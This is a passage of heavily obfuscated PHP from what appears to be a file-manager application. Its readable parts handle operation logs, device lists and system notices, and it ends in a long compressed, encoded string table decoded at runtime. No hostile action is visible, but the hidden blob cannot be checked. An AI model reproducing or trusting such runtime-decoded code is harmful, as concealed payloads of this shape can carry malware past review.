$f„˜–´ğ†Î[$c‰Õİ«½æ][$C”²¦ëº¥ä[401]] = json_encode($EªÒ¦Å¬‘Ğ); goto A¸Ş”º±Üê; F¥ªáø¤Îˆ: } goto BÃãêÅ“‘; CÃö”÷×àé: if ($EªÒ¦Å¬‘Ğ[$C”²¦ëº¥ä[29]] == $C”²¦ëº¥ä[2246]) { $e¨‹Õíà™…[] = $EªÒ¦Å¬‘Ğ[$C”²¦ëº¥ä[401]][$C”²¦ëº¥ä[366]]; } goto b§Ï¢ÂŠ°Ì; b§Ï¢ÂŠ°Ì: } if (!$e¨‹Õíà™…) { return array(); } return Model($C”²¦ëº¥ä[744])->sourceListInfo($e¨‹Õíà™…, !0); } private function logList($b™‡•çëÖİ) { goto AæÜéËœƒï; CÎ¸™Ê¹Í: $d÷‰„âº®² = array(); foreach ($b™‡•çëÖİ as $cØ­ˆÑğĞ¨ => $DøöÈàÁëè) { goto eÛ†Ú‹Ù·•; d×œá­ò±Í: $DøöÈàÁëè[$F”œâ¡ÇÔ§[28]] = isset($eêä˜¼‹¨˜[$F”œâ¡ÇÔ§[28]]) ? $eêä˜¼‹¨˜[$F”œâ¡ÇÔ§[28]] : LNG($F”œâ¡ÇÔ§[2418]); $DøöÈàÁëè[$F”œâ¡ÇÔ§[2287]] = isset($eêä˜¼‹¨˜[$F”œâ¡ÇÔ§[2287]]) ? $eêä˜¼‹¨˜[$F”œâ¡ÇÔ§[2287]] : $F”œâ¡ÇÔ§[33]; $DøöÈàÁëè[$F”œâ¡ÇÔ§[1312]] = isset($A¨•ø‡ˆ[$aÁß÷×Ÿİ]) ? $A¨•ø‡ˆ[$aÁß÷×Ÿİ] : $FÍ§ĞÛ¸Ê¢; goto EÜ‡Õã¬³; EÜ‡Õã¬³: $DøöÈàÁëè[$F”œâ¡ÇÔ§[2204]] = $eêä˜¼‹¨˜; $cÁŠ«ÕÃ„½ = json_decode($DøöÈàÁëè[$F”œâ¡ÇÔ§[401]], !0); $DøöÈàÁëè[$F”œâ¡ÇÔ§[2415]] = isset($cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[2415]]) ? $cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[2415]] : $F”œâ¡ÇÔ§[33]; goto eéÎªÆ¯¬è; eéÎªÆ¯¬è: $this->ipAddress($DøöÈàÁëè); if (strpos($aÁß÷×Ÿİ, $F”œâ¡ÇÔ§[2239]) === 0 || isset($cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[2238]])) { goto aÈÄ×±ÏÕ“; AÁŠ™ÊÇš: if ($cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[2251]] && $cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[2251]][$F”œâ¡ÇÔ§[368]] == $F”œâ¡ÇÔ§[1073]) { $d÷‰„âº®²[] = $DøöÈàÁëè[$F”œâ¡ÇÔ§[364]]; unset($b™‡•çëÖİ[$cØ­ˆÑğĞ¨]); continue; } goto FÁİ¢µ¤; aÁåŞèÃÒ®: if ($cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[29]] == $F”œâ¡ÇÔ§[2246]) { $cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[401]][$F”œâ¡ÇÔ§[366]] = $b‡ÅìñĞª§[$cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[401]][$F”œâ¡ÇÔ§[366]]]; } if ($cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[29]] == $F”œâ¡ÇÔ§[2034]) { $cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[2251]] = $cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[388]]; $cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[2238]] = $cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[2251]][$F”œâ¡ÇÔ§[366]]; $cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[388]] = !1; $cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[366]] = $F”œâ¡ÇÔ§[33]; } if ($cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[388]] && $cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[388]][$F”œâ¡ÇÔ§[368]] == $F”œâ¡ÇÔ§[1073]) { $d÷‰„âº®²[] = $DøöÈàÁëè[$F”œâ¡ÇÔ§[364]]; unset($b™‡•çëÖİ[$cØ­ˆÑğĞ¨]); continue; } goto AÁŠ™ÊÇš; aÈÄ×±ÏÕ“: $cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[388]] = $b‡ÅìñĞª§[$cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[366]]]; $cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[2251]] = $b‡ÅìñĞª§[$cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[2238]]]; if ($cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[29]] == $F”œâ¡ÇÔ§[488]) { $cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[401]][$F”œâ¡ÇÔ§[999]] = $b‡ÅìñĞª§[$cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[401]][$F”œâ¡ÇÔ§[999]]]; $cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[401]][$F”œâ¡ÇÔ§[1000]] = $b‡ÅìñĞª§[$cÁŠ«ÕÃ„½[$F”œâ¡ÇÔ§[401]][$F”œâ¡ÇÔ§[1000]]]; } goto aÁåŞèÃÒ®; FÁİ¢µ¤: } $DøöÈàÁëè[$F”œâ¡ÇÔ§[401]] = $cÁŠ«ÕÃ„½; goto d™¢¾¯®ÄÂ; d™¢¾¯®ÄÂ: unset($DøöÈàÁëè[$F”œâ¡ÇÔ§[2424]]); $c÷ÚÜ±ô‹[] = $DøöÈàÁëè; goto f½†–•Œ‡ë; eÛ†Ú‹Ù·•: $aÁß÷×Ÿİ = $DøöÈàÁëè[$F”œâ¡ÇÔ§[29]]; $eêä˜¼‹¨˜ = isset($eèô¦†ëÚµ[$DøöÈàÁëè[$F”œâ¡ÇÔ§[1404]]]) ? $eèô¦†ëÚµ[$DøöÈàÁëè[$F”œâ¡ÇÔ§[1404]]] : !1; $FÍ§ĞÛ¸Ê¢ = strpos($aÁß÷×Ÿİ, $F”œâ¡ÇÔ§[2422]) === 0 ? LNG($F”œâ¡ÇÔ§[2423]) : LNG($F”œâ¡ÇÔ§[2418]); goto d×œá­ò±Í; f½†–•Œ‡ë: } $this->clearSystemPathLog($d÷‰„âº®²); goto aî¾®Â…¾; aî¾®Â…¾: return $c÷ÚÜ±ô‹; goto EšË©¤¼Áö; AæÜéËœƒï: $F”œâ¡ÇÔ§ =& $_SERVER[¼]; $cì–¬éøòã = array_to_keyvalue($b™‡•çëÖİ, $F”œâ¡ÇÔ§[33], $F”œâ¡ÇÔ§[1404]); $eèô¦†ëÚµ = Model($F”œâ¡ÇÔ§[473])->userListInfo(array_unique($cì–¬éøòã)); goto b‚³—ÀÉ©; b‚³—ÀÉ©: $b‡ÅìñĞª§ = $this->getSourceList($b™‡•çëÖİ); $A¨•ø‡ˆ = $this->typeAll(); $c÷ÚÜ±ô‹ = array(); goto CÎ¸™Ê¹Í; EšË©¤¼Áö: } private function clearSystemPathLog($f ‘¦ëå¿•) { $fÖš“çÃ‡” =& $_SERVER[¼]; if (count($f ‘¦ëå¿•) == 0) { return; } $F×è‘“á¯£ = array($fÖš“çÃ‡”[364] => array($fÖš“çÃ‡”[7], array_unique($f ‘¦ëå¿•))); $this->where($F×è‘“á¯£)->delete(); } public function deviceList($CŸÄà¸ùâÛ, $bó—ˆÜ³ = 0) { $Fñ‰•–šÑñ =& $_SERVER[¼]; $aÀçâÀ—îÍ = array($Fñ‰•–šÑñ[1404] => $CŸÄà¸ùâÛ, $Fñ‰•–šÑñ[184] => array($Fñ‰•–šÑñ[923], $bó—ˆÜ³), $Fñ‰•–šÑñ[29] => $Fñ‰•–šÑñ[2007]); $F²¾Æ¸ƒéà = array(); $dÀèáµŠ = $this->field($Fñ‰•–šÑñ[2425])->where($aÀçâÀ—îÍ)->order($Fñ‰•–šÑñ[2249])->limit(50)->select(); foreach ($dÀèáµŠ as $bÙ´¹¹™ªô => $Eõ…±„Å¥ù) { goto d„Ÿ ÂÇ°; CÓÍ¡‹Ä¤: $this->ipAddress($Eõ…±„Å¥ù); $Eõ…±„Å¥ù[$Fñ‰•–šÑñ[401]] = $E²óÈ¯‡‰·; $F²¾Æ¸ƒéà[$e‡’µ¸·Õ³] = $Eõ…±„Å¥ù; goto dâåĞëäòå; d„Ÿ ÂÇ°: if ($bÙ´¹¹™ªô > 0 && abs($Eõ…±„Å¥ù[$Fñ‰•–šÑñ[184]] - $dÀèáµŠ[$bÙ´¹¹™ªô - 1][$Fñ‰•–šÑñ[184]]) < 5) { continue; } $E²óÈ¯‡‰· = json_decode($Eõ…±„Å¥ù[$Fñ‰•–šÑñ[401]], !0); $Eõ…±„Å¥ù[$Fñ‰•–šÑñ[2415]] = isset($E²óÈ¯‡‰·[$Fñ‰•–šÑñ[2415]]) ? $E²óÈ¯‡‰·[$Fñ‰•–šÑñ[2415]] : $Fñ‰•–šÑñ[33]; goto D³ˆØ”Øà; D³ˆØ”Øà: unset($E²óÈ¯‡‰·[$Fñ‰•–šÑñ[2415]]); $e‡’µ¸·Õ³ = $this->deviceType($E²óÈ¯‡‰·[$Fñ‰•–šÑñ[2240]]); if (isset($F²¾Æ¸ƒéà[$e‡’µ¸·Õ³])) { continue; } goto CÓÍ¡‹Ä¤; dâåĞëäòå: } return array_values($F²¾Æ¸ƒéà); } public function deviceType($Bšîâ¸È·) { return $Bšîâ¸È·; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\x2e\156\x6f\x74\151\x63\145\114\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\143\157\x6e\x74\145\x6e\164", "\x61\165\x74\150", "\x6d\157\144\145", "\x74\151\x6d\x65", "\x74\171\x70\145", "\x6c\x65\166\145\x6c", "\x65\156\141\142\154\x65", "\x73\x6f\x72\164"); public function listData($a£ô…†­ç± = false, $BãŠåŠãİÑ = "\x73\157\162\x74", $D§©Ê£ß¤ô = false) { return parent::listData($a£ô…†­ç±, $BãŠåŠãİÑ, $D§©Ê£ß¤ô); } public function add($aİìø¢‘›) { goto dâ¾ù—Ö·ø; D©íÌÕ×óÍ: $e‚±ïîÃïÎ = time(); if ($aİìø¢‘›[$E‰Ü¥é§éà[12]] == $E‰Ü¥é§éà[2426]) { $e‚±ïîÃïÎ = strtotime($aİìø¢‘›[$E‰Ü¥é§éà[187]]); } $aİìø¢‘›[$E‰Ü¥é§éà[187]] = $e‚±ïîÃïÎ; goto d…¼‡å‚¨¦; d…¼‡å‚¨¦: return parent::insert($aİìø¢‘›); goto c›Şâ³¼©Ñ; dâ¾ù—Ö·ø: $E‰Ü¥é§éà =& $_SERVER[¼]; $B©Çµóùš‹ = $this->findByName($aİìø¢‘›[$E‰Ü¥é§éà[28]]); if ($B©Çµóùš‹) { return !1; } goto D©íÌÕ×óÍ; c›Şâ³¼©Ñ: } public function update($dì—ì‘÷š, $AÎğğóá¥) { goto aäÛÙéŒ; C¸ˆ‹§ÇÕ²: if (!$eÊÜ¯Íö¬ò || $fÇ­Şõí´‰ && $fÇ­Şõí´‰[$cÙÏ½àÔ‘ô[364]] != $eÊÜ¯Íö¬ò[$cÙÏ½àÔ‘ô[364]]) { return !1; } $c‹ÈàˆšÅ” = time(); if ($AÎğğóá¥[$cÙÏ½àÔ‘ô[12]] == $cÙÏ½àÔ‘ô[2426]) { $c‹ÈàˆšÅ” = strtotime($AÎğğóá¥[$cÙÏ½àÔ‘ô[187]]); } goto d¼çÍğø; aäÛÙéŒ: $cÙÏ½àÔ‘ô =& $_SERVER[¼]; $eÊÜ¯Íö¬ò = $this->listData($dì—ì‘÷š); $fÇ­Şõí´‰ = $this->findByName($AÎğğóá¥[$cÙÏ½àÔ‘ô[28]]); goto C¸ˆ‹§ÇÕ²; d¼çÍğø: $AÎğğóá¥[$cÙÏ½àÔ‘ô[187]] = $c‹ÈàˆšÅ”; return parent::update($dì—ì‘÷š, $AÎğğóá¥); goto Aø·èÛ×œÀ; Aø·èÛ×œÀ: } public function remove($aáğ¤ó­Ó) { $a×¹ƒ˜ÕÅ¶ = $this->listData($aáğ¤ó­Ó); if (!$a×¹ƒ˜ÕÅ¶ || $a×¹ƒ˜ÕÅ¶[$_SERVER[¼][1073]]) { return !1; } return parent::remove($aáğ¤ó­Ó); } public function sort($BóÔæò¬é¬, $C•†¢ïÒâ) { return parent::update($BóÔæò¬é¬, $C•†¢ïÒâ); } public function enable($DóªãŠ˜„í, $A³ÔÛ‘¸ˆ×) { return parent::update($DóªãŠ˜„í, array($_SERVER[¼][2427] => $A³ÔÛ‘¸ˆ×)); } private function initUserOption() { $d¥¥¬°©œ =& $_SERVER[¼]; $this->optionType = $d¥¥¬°©œ[2428]; $this->modelType = $d¥¥¬°©œ[2429]; $this->field = array($d¥¥¬°©œ[2430], $d¥¥¬°©œ[28], $d¥¥¬°©œ[187], $d¥¥¬°©œ[29], $d¥¥¬°©œ[2431], $d¥¥¬°©œ[681], $d¥¥¬°©œ[180]); } public function userNoticeGet($DÃä…„ŸœÊ = false) { $this->initUserOption(); return parent::listData($DÃä…„ŸœÊ, $_SERVER[¼][364], !0); } public function userNoticeAdd($B£±ÕË²Ä) { $EÌ‰ÕÈôå =& $_SERVER[¼]; $this->initUserOption(); $eÄˆ›”¥‰Ó = $this->findByKey($EÌ‰ÕÈôå[2430], $B£±ÕË²Ä[$EÌ‰ÕÈôå[364]]); if ($eÄˆ›”¥‰Ó) { return !0; } $cäòÃ•İÂô = array($EÌ‰ÕÈôå[2430] => $B£±ÕË²Ä[$EÌ‰ÕÈôå[364]], $EÌ‰ÕÈôå[28] => $B£±ÕË²Ä[$EÌ‰ÕÈôå[28]], $EÌ‰ÕÈôå[187] => $B£±ÕË²Ä[$EÌ‰ÕÈôå[187]], $EÌ‰ÕÈôå[29] => isset($B£±ÕË²Ä[$EÌ‰ÕÈôå[29]]) ? $B£±ÕË²Ä[$EÌ‰ÕÈôå[29]] : 1, $EÌ‰ÕÈôå[2431] => isset($B£±ÕË²Ä[$EÌ‰ÕÈôå[2431]]) ? $B£±ÕË²Ä[$EÌ‰ÕÈôå[2431]] : 0, $EÌ‰ÕÈôå[681] => 0, $EÌ‰ÕÈôå[180] => 0); return parent::insert($cäòÃ•İÂô); } public function userNoticeEdit($e›Ü¹òõôğ, $F®¾“ò Ÿß) { $this->initUserOption(); return parent::update($e›Ü¹òõôğ, $F®¾“ò Ÿß); } } goto a§Æ”†˜ŒÂ; E¬ç‡˜İˆ¶: if (!function_exists('_kodDe')) { function _kodDe($bÅòØ Ç¹Í) { $bÅòØ Ç¹Í = base64_decode($bÅòØ Ç¹Í); $bŞœ‘½«ÊŒ = strlen($bÅòØ Ç¹Í); $BŸ©‚ëï£È = ''; $C¿ÙçôÃÌÖ = ord($bÅòØ Ç¹Í[0]) - 30; for ($cƒùŠø°ô¡ = 1; $cƒùŠø°ô¡ < $bŞœ‘½«ÊŒ; $cƒùŠø°ô¡ += 2) { if ($cƒùŠø°ô¡ + 1 < $bŞœ‘½«ÊŒ) { $BŸ©‚ëï£È .= chr(ord($bÅòØ Ç¹Í[$cƒùŠø°ô¡ + 1]) + $C¿ÙçôÃÌÖ); $BŸ©‚ëï£È .= chr(ord($bÅòØ Ç¹Í[$cƒùŠø°ô¡]) + $C¿ÙçôÃÌÖ); } else { $BŸ©‚ëï£È .= chr(ord($bÅòØ Ç¹Í[$cƒùŠø°ô¡]) + $C¿ÙçôÃÌÖ); } } return $BŸ©‚ëï£È; } } define("\274", "\xd2\x9a\x8e\xc1\xa2\xeb"); $_SERVER[¼] = explode("\x7c\x4\x7c\x1\x7c\x1", gzinflate(substr(strrev('•¤±¼•¤¬£–$ã’G-‘+l¶È“‰Àå|:#à†,£”rÒ…4%'."\n".'0ÕÅ`	}'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹').strrev('›Íã™¼Şf´şÚd•oÿ'."\r".',û†Ğ	)Jr”,áœ´ PÜ¡ ZP)hZ¹BĞ›”(²Ww')."\67\63\357\275\371\335\317\37\334\270\373\306\257\154\374\312\145\317\135\114\3\350\177\273\155\334\203\206\17\77\343\153\273\220\377\166\313\55\277\267\177\327\246\175\67\67\275\373\312\120\341\275\224\362\156\377"."\xd7\xbf\xb6\xf5\x60\xed\xb4\x65\xb1\xd6\xa3\xfb\xf4\x3d\x6f\xb9\xf4\xa6\xbe\x17\x37\xdf\xf7\xce\xbb\xd7\x3d\xea\xba\x73\x3f\xcf\x4f\x3f\x7e\x6a\xaa\xc5\x48\x3f\xb7\x33\x71\xdc\xed\xf7\xac\xbf\x79\xbf\xd6\xe\xf5\xb1\xa5\xd7"."\x7e\x73\xd9\x77\x3f\x3d\x67\xcf\x25\x7f\xfe\xc3\x93\xf7\xbf\x62\xdf\xbe\x62\x8f\x77\xaf\x39\xe9\x76\x6b\x64\x68\xfe\x51\x2f\xfe\x72\xc7\x57\xfe\x3c\xeb\xfb\xdb\x8f\x68\xd5\x7\x9f\x78\xe3\xda\x3f\xbf\xb2\xe1\x8b\xe1\x9f\xbe"."\x76\xde\xcf\x4e\x7f\xe6\xb1\xbb\xeb\xde\x3d\x78\xb7\x49\xa3\xbd\x63\xa3\xd1\xf8\x41\xe0\xbb\xbf\x9b\x38\xef\xec\x2d\x97\xc7\x3d\xbb\x7f\xbf\xf1\xd6\x43\x1a\xcf\xdd\x6f\xc6\x93\x3f\xb9\xf7\x1b\xbb\xbf\xd7\xff\xd2\xf5\xfb\xfd"."\xfb\x53\x65\xcd\x7d\xbd\xe7\x5f\xf6\xc2\x9\xee\x23\x1f\xfb\xda\xd\x5b\xf6\x7b\xf7\xe9\xc9\x63\x2f\xbb\xeb\xfa\x53\xce\x7b\xf2\x9a\x3\x97\xcf\xd\x58\x1f\x5d\x7c\x45\x64\x6e\xdf\xeb\xd9\xdf\xf6\xf6\xde\xf9\xfd\xf3\x3e\xfc"."\xe1\xfe\xda\xb9\x1f\x5d\x94\xfe\xee\x37\x7e\xf3\xda\xf7\x1e\xdb\xe3\xfd\xbd\xde\xbb\x20\xf5\x50\xf7\xc3\x87\x9c\xf3\xe0\xd5\xbf\xd8\x71\xe6\x45\xed\xaf\xfd\xe5\x10\xed\x8d\x9f\xad\xfa\x60\xe9\xf\x9f\xbd\x6a\xf3\xd2\x1f\x9e"."\375\315\371\373\234\320\243\274\175\353\101\7\305\353\147\76\170\343\107\223\337\271\366\226\330\334\75\77\215\315\257\335\361\362\156\117\54\376\54\327\367\313\143\137\371\313\356\356\344\127\22\67\147\276\342\151".base64_decode('GFt57+ZrHj+u3zroqlnZtqNuOnvzeVu/W7v73Y9t0g7ceM7OXUM7V73811132YX2dBv9UfKGrWg=')."\x93\xba\x65\x5b\x14\x90\x34\xf2\x69\x3d\x43\xc3\x7a\x9e\xfe\x7a\xe9\x8f\x35\x9e\xd5\x6d\x8d\x86\xe3\xfd\xa1\x68\x3c\x32\x38\x30\xe0\xf\x47\xe3\x50\xa2\x9c\x9e\x33\x52\x10\x2a\xa8\xa6\x9a\x83\xc2\xb\x9a\x69\xa1\x4f\xc9\xc5"."\305\13\106\101\313\73\40\2\220\122\155\65\241\132\120\122\127\107\274\313\77\20\14\255\212\107\127\15\370\1\43\21\37\57\152\346\24\215\221\140\304\126\115\73\252\347\64\216\61\141\362\172\165\370\173\2".base64_decode('/Uo07OuP+DqjgVA/BXeG+voC0Up4OBQMdvg6l1WmDIR9PX0+BdUvq8X1fNqoU9bSlLVKPQ1061o=')."\66\105\203\171\225\125\307\236\52\100\50\312\103\150\14\362\305\154\226\106\372\171\10\352\257\245\325\142\26\372\254\113\216\24\114\75\247\262\246\57\323\246\70\224\6\324\242\155\350\371\44\215\370\47\155\123"."\25\160\124\343\244\251\345\264\74\24\25\361\7\375\235\121\5\127\123\351\16\207\372\24\30\212\234\152\331\232\251\14\365\372\303\176\5\127\275\275\226\264\270\126\241\371\6\373\121\207\50\276\140\120\231\256"."\4\133\313\25\130\61\64\117\225\302\102\341\56\177\130\351\130\245\210\176\112\32\271\234\221\367\240\122\320\170\332\122\125\375\341\60\15\270\200\202\203\1\74\164\20\11\165\167\107\374\74\6\215\133\36\104".base64_decode('NWkBKnXEUumsHS+p2SIj1jH6Wws/8GtYQMDjel4vArFCEYbBZw4EigxbY5AcymbAnEITrESD7Ys=').base64_decode('6O8CQErEcZpm2nEtnzRSeh6m4WKYckB4qj3aZeoIDwo0PEmjMNVnlKANaT2rBfksSxvZlGaKeAE=').base64_decode('ZZdToDH6eil3fzEno/BoclTPpkw2Ob8MswmK1WwbNcNiNR0sZA01FdFMqfbdqJhQ0ZaBRYLWbZg=')._kodDe('LR+q8bVokcoBdNwDRgm3mNI/lRaSsqEN3NceE7h6rdEPZlvQtOBkCg1zT5rvB/h0CIBryltNXcWM')."\140\366\344\122\163\54\326\64\257\225\320\363\136\4\241\321\100\50\76\252\132\243\175\251\71\161\222\213\161\316\224\66\351\51\214\26\140\202\363\71\15\144\215\107\241\337\260\375\22\343\315\32\111\25\220\106".base64_decode('bbsQ0fIp3DXQNmMiT7quoGnQrC6XklL6lFVKb5vexugMUU16SvC+UTvHi8yxpnGYxYH2JFBHDcQ=').base64_decode('tUkbekRZkBxVTTSQ7UU77Z4PLKRQyOpJ1daNvNdI2prttmxTU6G0mgUKpg08lxtoLjaPOo28jSY=')."\xb2\x3b\x6a\xaa\x79\x2b\xad\x99\x6e\x3f\x10\x7a\x9b\x82\x3a\x95\xf3\x32\x86\xd6\xa5\x5b\x5\xc3\xd2\xf1\x67\xda\x14\xd5\xb6\xd5\xe4\x28\xe6\x3\xa2\xf8\xf6\x2f\xc1\xd7\xf3\x59\x3d\xaf\x55\xe0\xfa\x92\x49\xcd\xb2\xdc\x38\x8b"."\151\144\335\276\154\326\230\160\207\114\75\243\243\74\15\145\325\104\74\252\115\141\14\264\240\233\232\305\242\112\117\137\24\220\121\255\64\367\200\251\146\162\152\233\122\50\46\120\317\300\114\255\2\243\330\360"."\365\66\45\211\243\56\45\127\264\154\267\251\41\106\244\243\45\17\6\57\220\166\367\341\361\324\265\224\73\202\370\65\200\133\32\133\25\104\72\12\113\243\320\336\150\164\40\36\350\106\313\162\277\77\336\347".base64_decode('i3b2QrVtNcPqHERcmBfJgCvdaPJhQutHfSSAA8aEZqIPd0y1KWNGKmFMelgSRsaTiSHjHi3Y7rA=')."\232\317\340\376\111\114\331\32\220\243\125\312\260\345\45\274\302\37\216\107\102\335\321\41\137\30\226\356\74\352\362\111\126\50\56\44\353\16\153\51\324\311\111\233\25\255\26\160\377\60\34\74\45\360\150\262"."\124\74\115\130\132\60\320\203\273\240\313\155\41\44\267\214\305\312\16\352\71\35\327\322\346\51\244\317\320\272\336\3\25\362\222\252\267\307\106\33\352\142\251\331\365\156\364\157\103\375\160\254\313\323\60\262".strrev('‚„~Ü‚êÚ?ŸxÑ#ú—û'."\n".'öAG±Ÿ-AQIÌ´%FŒ'."\n".'— f®†‚@W8ÜÒ“O&Ş<‹«Ø')."\x9d\x60\xac\xb6\xc3\xf4\x67\x4\xc6\x1\x2d\xfd\x19\x2d\x69\x64\xd\x53\xcd\x62\xd6\xc1\xa8\x46\x63\x53\x39\xa3\xa7\x5\x9f\xe\x20\x1\x5\x3a\x8d\x32\x2b\x11\x89\xe8\xb9\x2\x63\x33\xf6\x68\x31\x97\x90\x82\x5e\x51\x2\x8c"."\50\32\16\316\134\14\276\246\30\46\204\332\274\220\145\126\163\67\343\217\336\110\13\372\277\140\206\51\43\247\62\311\222\114\77\55\105\347\37\5\65\70\122\172\65\125\54\122\266\151\33\30\152\72\120\372".base64_decode('NHvUgGmQ0ViVirxurJYpLauxXhrV2OqAxKUS77yCqaV1oEkkHyG44KW6FUaZsLzC4kNYrBQAW7A=')."\135\325\22\254\33\107\244\225\266\173\60\30\214\167\206\372\243\110\264\244\220\241\160\40\352\147\24\341\353\212\373\72\7\370\252\43\206\11\20\360\44\253\144\122\24\122\152\226\270\267\140\363\202\161\262\265"."\11\63\106\32\106\34\255\140\344\55\315\235\204\322\122\202\205\122\214\5\145\374\263\42\207\20\150\47\335\152\156\275\73\247\331\252\233\127\335\271\112\51\121\171\171\16\300\20\10\226\227\105\313\41\332\57"."\260\45\161\40\24\201\14\213\61\24\111\27\11\315\204\172\14\14\102\122\116\32\376\36\77\0\147\260\25\116\5\111\304\67\24\141\354\252\210\360\115\175\275\52\332\270\230\325\7\312\236\314\145\205\300\24"."\xd7\x1d\xe3\x17\x37\x12\xeb\x10\x87\x42\x44\xa7\x56\x6b\xb5\x5b\x8c\x55\xb4\x37\xd0\xbf\x2c\xde\x17\xea\xf2\x7\xe3\x81\x7e\xc4\x2\xa3\x95\xf0\xc1\x81\x2e\x1f\x1b\x7c\x19\xde\x11\x8a\xf6\x3a\xa0\x83\x88\x4f\xac\xf0\x5\x3"."\345\350\376\225\201\110\64\122\65\11\301\6\375\145\51\150\13\65\20\366\167\7\126\362\150\167\300\37\354\212\304\73\175\235\275\2\247\337\327\7\221\170\32\157\142\54\257\23\77\216\270\171\204\157\205\342"._kodDe('K68YVqAMkN9q1S6VP/6BNC2DPqf5wPyOuMU8gwWGZIQ5HkSuin9l1zSLRx2UUU7b3bBCftVpG8EU')."\131\101\142\212\7\111\63\130\34\11\132\360\175\5\230\157\105\15\342\30\247\103\113\33\246\366\145\0\137\332\346\204\121\26\107\363\106\244\241\21\360\221\135\53\242\4\62\42\161\66\27\55\44\357\373\130"."\x75\xd2\x62\xc7\x18\xf\xa1\xad\xb5\xf\xef\x37\xe3\x43\xe1\x50\x7f\xf\x64\x98\x18\xd5\x58\x5\x2\xd0\xfd\x75\x4c\x24\x81\x6d\xa7\x2d\x58\x12\x92\x27\x54\x21\x1a\xb2\x4e\x5f\x67\xb0\xae\xdc\x48\x7f\x8e\xa6\x3f\x48\x4\x83"."\217\153\171\326\353\11\314\230\71\343\140\173\12\64\133\30\123\65\212\374\153\11\303\310\262\171\214\326\132\316\57\370\206\165\235\305\210\144\222\61\247\331\154\325\202\305\41\32\132\346\357\217\63\312\242\61".strrev('±'."\n".'4%†úAíì7]˜›]ï>õ¡¬T'."\r".'™ëËºÎ¢ñµ0GöšcÛèaCm'."\0".')‰')."\x98\xc7\x11\x3d\xa\xf2\x17\x4d\x9e\x1b\x8b\x20\x75\xd6\xe2\xfa\xb6\x98\x37\xe6\xad\x5b\xdc\x36\xec\x73\xaf\x57\xdd\xeb\x1b\xdd\xc7\xb8\x47\x66\xc7\x3c\xf5\xb3\x1\x30\xb2\xa1\xd9\xd5\xba\x9\x23\x20\xc4\xc5\x47\x8e\xa0\x9f"."\xf6\xd8\xe2\x59\x31\xf7\xd1\xc7\xae\x5d\x32\x1c\x1b\xa9\x6d\x9b\x7d\x44\xcc\x73\x64\x6c\x62\xa4\xa1\x7e\x31\xfb\x4e\xb2\x68\xa2\xcd\x56\x72\x8a\x57\x35\x35\xbb\xe\x55\x9\x89\x26\x1c\x25\x4f\x58\xa2\x84\xc0\x12\xd6\xeb\x5".base64_decode('Ad0wdxODozHUMiLHsDs2e2SxlE8ClX8LiS6IP49yPJ97NW4Zz4rnPdBHMZ8U3BXPi4SaBD6gZ/I=')."\x7c\xa\xa1\x5\x9d\x6f\x72\x9d\xb2\xef\x86\x59\xf4\x77\x13\x1b\xc8\x8c\xc6\x96\x65\x7c\x3e\x65\x2\x75\x16\xf3\xfa\x38\xdb\xba\xe7\xb5\x71\x8\x18\x36\xa3\xef\x84\x66\x4f\x68\x8c\x3c\x10\xdc\x11\x47\xc4\xc1\x36\x5c\x28\x49"."\212\145\211\220\6\137\20\233\36\215\354\0\240\25\205\70\26\273\46\170\54\245\345\141\234\366\2\154\53\251\26\264\210\324\302\170\74\352\353\10\372\343\214\303\0\47\146\161\302\25\73\370\141\27\152\232"."\xe0\xa8\x7c\xf7\x28\xc4\x61\x6b\x3c\xab\x10\x66\xa0\x68\xa6\x69\x98\x6d\xe4\x20\xcf\x2a\x16\xb0\x2c\x86\xf6\x3e\x36\xea\x4f\x5\x6d\x8d\x95\xf6\x45\xa\xed\x66\xe0\x12\x71\xb9\xd3\xb\x2a\x93\x26\xf0\xbe\x94\x4b\x8\xde\xba"."\130\254\70\254\245\106\206\21\41\253\356\364\310\206\226\115\365\114\2\366\306\320\177\54\102\371\27\324\270\40\306\317\102\262\126\322\346\13\156\305\171\123\234\163\100\134\5\176\154\140\230\174\235\305\160\41"._kodDe('LsqlnXYpVj4KUnvT+Fwmdp0lzbANUJBoMoZl0z53+NfcPTf07CoxMviHIJUEpu8gx40mAzdDkUIc').base64_decode('gS43DKJvpTsAAjwP6EzUVNF0thnUMopmUuM4DiHDVk20ZgnJDstg0nEhqrkLnyC48JrqQtKeC58=').base64_decode('37iExOoSBwEuLn+6QCx1idIhGOhy6VYXEY9JuSSJ1dkexdvqrDrlovUPaiUt62K1d7FGuVgLXGQ=').strrev('>â¶.Øa°€å5'."\0".'2´b’_`X£LevàB]ªupR²Øğ8x]F$ÄA!µôDµÑ¿').base64_decode('zoFwdURohRhwUXu+fEITaLy8DhSK07vVkjzAVQc77yQMceopTueEuFS+ESk/5BGdKCoRVTMR6fM=')."\xb6\x9a\x61\xdf\xa6\xe0\xb0\x96\x9c\x4a\x8a\x9d\x4c\x97\xb4\x35\x72\xc6\xf8\x38\x13\xa2\xab\x46\x39\xd5\xc7\x99\x53\x3\x27\xac\x19\x7b\xed\xc5\xc8\x58\x10\xd\xd0\x8a\x